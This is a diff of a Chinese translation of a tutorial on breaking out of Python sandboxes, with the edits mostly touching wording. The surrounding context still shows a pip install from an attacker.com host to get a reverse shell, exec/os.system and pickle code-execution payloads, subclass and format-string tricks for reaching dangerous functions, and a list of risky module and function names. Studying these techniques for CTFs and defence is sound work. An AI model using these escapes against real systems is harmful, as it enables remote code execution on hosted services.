@@ -52,7 +52,7 @@ Python 尝试 **首先从当前目录加载库**（以下命令将打印 python 
 ### 默认包
 
 你可以在这里找到 **预安装包的列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-请注意，从一个 pickle 中，你可以使 python 环境 **导入系统中安装的任意库**。\
+请注意，从一个 pickle 中你可以使 python 环境 **导入系统中安装的任意库**。\
 例如，以下 pickle 在加载时将导入 pip 库以使用它：
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -66,32 +66,32 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-有关pickle工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+有关 pickle 工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip包
+### Pip 包
 
-技巧由**@isHaacK**分享
+技巧由 **@isHaacK** 分享
 
-如果您可以访问`pip`或`pip.main()`，您可以安装任意包并通过调用获得反向shell:
+如果您可以访问 `pip` 或 `pip.main()`，您可以安装任意包并通过调用获得反向 shell:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-您可以在此处下载创建反向 shell 的包。请注意，在使用之前，您应该 **解压缩它，修改 `setup.py`，并输入您的反向 shell 的 IP**：
+您可以在此处下载创建反向 shell 的包。请注意，在使用之前，您应该**解压缩它，修改 `setup.py`，并输入您的反向 shell 的 IP**：
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
-> [!NOTE]
-> 该包名为 `Reverse`。然而，它是特别制作的，以便在您退出反向 shell 时，其余的安装将失败，因此您 **在离开时不会在服务器上留下任何额外的 python 包**。
+> [!TIP]
+> 这个包被称为 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
 
 ## 评估 python 代码
 
 > [!WARNING]
 > 请注意，exec 允许多行字符串和“;”，但 eval 不允许（检查海象运算符）
 
-如果某些字符被禁止，您可以使用 **十六进制/八进制/B64** 表示法来 **绕过** 限制：
+如果某些字符被禁止，您可以使用**十六进制/八进制/B64**表示法来**绕过**限制：
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -182,7 +182,7 @@ class _:pass
 
 #### 使用自定义类的 RCE
 
-你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
+你可以修改一些 **类方法**（_通过覆盖现有类方法或创建新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -251,7 +251,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 创建带有异常的对象
 
-当**异常被触发**时，**Exception**的一个对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)的技巧）：
+当**异常被触发**时，**Exception**的对象会被**创建**，而无需您直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)的技巧）：
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -302,7 +302,7 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-## 内置
+## 内置函数
 
 - [**Python2 的内置函数**](https://docs.python.org/2/library/functions.html)
 - [**Python3 的内置函数**](https://docs.python.org/3/library/functions.html)
@@ -314,8 +314,8 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
-然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是无害的，但其中一些 **也导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
+当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...） **都没有加载**。\
+然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看似无害，但其中一些 **也导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
 
 在以下示例中，你可以观察到如何 **滥用** 一些加载的 "**无害**" 模块，以 **访问** 其中的 **危险** **功能**。
 
@@ -401,15 +401,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**下面有一个更大的函数**](#recursive-search-of-builtins-globals) 用于查找数十/**数百**个可以找到 **globals** 的 **地方**。
+[**下面有一个更大的函数**](#recursive-search-of-builtins-globals) 来查找数十/**数百**个可以找到**globals**的**地方**。
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现 **加载的更危险功能** 并提出更可靠的利用方法。
+在这里，我想解释如何轻松发现**加载的更危险功能**并提出更可靠的利用方式。
 
 #### 通过绕过访问子类
 
-此技术最敏感的部分之一是能够 **访问基本子类**。在之前的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 完成的，但还有 **其他可能的方法**：
+此技术最敏感的部分之一是能够**访问基础子类**。在之前的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 完成的，但还有**其他可能的方法**：
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -502,7 +502,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-此外，如果您认为**其他库**可能能够**调用函数以执行命令**，我们还可以**通过函数名称过滤**可能的库：
+此外，如果您认为**其他库**可能能够**调用函数以执行命令**，我们还可以**按函数名称过滤**可能的库：
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -535,7 +535,7 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## 递归搜索内置对象、全局变量...
+## 递归搜索内置对象、全局对象...
 
 > [!WARNING]
 > 这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本**递归查找可以找到该对象的地方。**
@@ -682,7 +682,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而使用 **括号** 访问 **字典元素**，且不需要引号 `__globals__[CONFIG]`。
+注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而使用 **括号** 访问 **字典元素**，不带引号 `__globals__[CONFIG]`。
 
 还要注意，你可以使用 `.__dict__` 来枚举对象的元素 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。
 
@@ -702,10 +702,11 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**更多关于** **格式** **字符串** 示例的例子可以在 [**https://pyformat.info/**](https://pyformat.info) 找到
+**更多关于** **格式** **字符串** 示例的例子可以在 [**https://pyformat.info/**](https://pyformat.info) 找到。
 
 > [!CAUTION]
 > 还请查看以下页面，了解将从 Python 内部对象中**读取敏感信息**的工具：
+
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -739,10 +740,10 @@ str(x) # Out: clueless
 
 在 [**Python execution without calls**](#python-execution-without-calls) 部分中还有更多类似的内容。
 
-Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法像 `'{0.system("/bin/sh")}'.format(os)` 这样获得 RCE。\
+Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法像 `'{0.system("/bin/sh")}'.format(os)` 那样获得 RCE。\
 然而，可以使用 `[]`。因此，如果一个常见的 Python 库具有 **`__getitem__`** 或 **`__getattr__`** 方法来执行任意代码，则可以利用它们来获得 RCE。
 
-在 Python 中寻找这样的 gadget，写作提供了这个 [**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)。他在这里找到了这个 [一个](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+在 Python 中寻找这样的 gadget，写作中提供了这个 [**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)。他在这里找到了这个 [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -772,8 +773,8 @@ pydll = LibraryLoader(PyDLL)
 
 ## 解剖 Python 对象
 
-> [!NOTE]
-> 如果你想深入**学习**关于**python 字节码**的内容，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> [!TIP]
+> 如果你想深入**了解** **python 字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 在一些 CTF 中，你可能会被提供一个**自定义函数的名称，其中包含标志**，你需要查看**函数**的**内部**以提取它。
 
@@ -898,7 +899,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-注意，如果您无法在 Python 沙箱中导入 `dis`，您可以获取函数的 **字节码** (`get_flag.func_code.co_code`) 并在本地 **反汇编** 它。您将看不到正在加载的变量的内容 (`LOAD_CONST`)，但您可以从 (`get_flag.func_code.co_consts`) 猜测它们，因为 `LOAD_CONST` 还告诉您正在加载的变量的偏移量。
+注意，如果**您无法在python沙箱中导入`dis`**，您可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。您将看不到正在加载的变量的内容（`LOAD_CONST`），但您可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉正在加载的变量的偏移量。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -923,7 +924,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## 编译 Python
 
 现在，让我们想象一下，您可以以某种方式**转储您无法执行的函数的信息**，但您**需要**去**执行**它。\
-就像在以下示例中，您**可以访问该函数的代码对象**，但仅仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
+就像在以下示例中，您**可以访问该函数的代码对象**，但仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
 ```python
 def get_flag(some_input):
 var1=1
@@ -938,7 +939,7 @@ return "Nope"
 ```
 ### 创建代码对象
 
-首先，我们需要知道 **如何创建和执行代码对象**，以便我们可以创建一个来执行我们泄露的函数：
+首先，我们需要知道 **如何创建和执行代码对象**，以便我们可以创建一个来执行我们的函数泄漏：
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -957,8 +958,8 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
-> [!NOTE]
-> 根据 Python 版本，`code_type` 的 **参数** 可能有 **不同的顺序**。了解您正在运行的 Python 版本中参数顺序的最佳方法是运行：
+> [!TIP]
+> 根据 Python 版本，`code_type` 的 **参数** 可能有 **不同的顺序**。了解您正在运行的 Python 版本中参数的顺序的最佳方法是运行：
 >
 > ```
 > import types
@@ -982,7 +983,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### 绕过防御
 
-在本文开头的前几个示例中，您可以看到 **如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以 **在一行代码中执行整个脚本**，包括循环等（我们也可以使用 **`exec`** 做同样的事情）。\
+在本文开头的前几个示例中，您可以看到 **如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以 **在一行中执行整个脚本**，包括循环等（我们也可以使用 **`exec`** 做同样的事情）。\
 无论如何，有时在本地机器上 **创建** 一个 **编译对象** 并在 **CTF 机器** 上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
 
 例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
@@ -1012,7 +1013,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-如果您无法访问 `eval` 或 `exec`，您可以创建一个 **适当的函数**，但直接调用它通常会失败，错误信息为：_在受限模式下构造函数不可访问_。因此，您需要一个 **不在受限环境中的函数来调用这个函数。**
+如果您无法访问 `eval` 或 `exec`，您可以创建一个 **适当的函数**，但直接调用它通常会失败，错误信息为：_在受限模式下构造函数不可访问_。因此，您需要一个 **不在受限环境中的函数来调用此函数。**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1035,7 +1036,7 @@ f(42)
 ### 断言
 
 使用参数 `-O` 执行的 Python 将删除断言语句和任何依赖于 **debug** 值的代码。\
-因此，检查像
+因此，像这样的检查
 ```python
 def check_permission(super_user):
 try:
